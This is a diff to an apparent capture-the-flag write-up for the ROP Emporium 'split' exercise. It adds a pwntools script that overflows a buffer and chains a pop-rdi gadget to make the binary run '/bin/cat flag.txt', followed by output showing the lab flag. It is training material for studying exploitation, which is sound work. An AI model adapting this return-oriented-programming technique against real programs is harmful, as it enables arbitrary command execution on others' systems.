@@ -182,7 +182,7 @@ gdb-peda$
 ```
 036 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt    
 ```
-### GDB string:
+### GDB string
 ```
 0x601060 <usefulString>:        "/bin/cat flag.txt"                                                
 0x601072 <usefulString+18>:     ""
@@ -193,4 +193,53 @@ gdb-peda$
 0x601077 <usefulString+23>:     ""
 0x601078 <usefulString+24>:     ""
 0x601079 <usefulString+25>:     ""                             
+```
+### Exploit
+```
+# Import the library
+from pwn import *
+
+# Debugging
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("split")
+
+# Variables
+usefulFunction = p64(0x400810)
+usefulString = p64(elf.symbols["usefulString"])
+poprdi = p64(0x0000000000400883)
+
+# Pack the arguments for the functions we want to call
+payload = "a" * 40
+payload += poprdi
+payload += usefulString
+payload += usefulFunction
+
+io = elf.process()
+gdb.attach(io)
+io.sendline(payload)
+data = io.recvall()
+print(data)
+```
+### Result
+```
+[root:~/Downloads/RopEmporium]# python exploit-split-x64.py
+[*] '/root/Downloads/RopEmporium/split'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/root/Downloads/RopEmporium/split': pid 17865
+[+] Receiving all data: Done (109B)
+[*] Stopped process '/root/Downloads/RopEmporium/split' (pid 17865)
+split by ROP Emporium
+64bits
+
+Contriving a reason to ask user for data...
+> ROPE{a_placeholder_32byte_flag!}
 ```
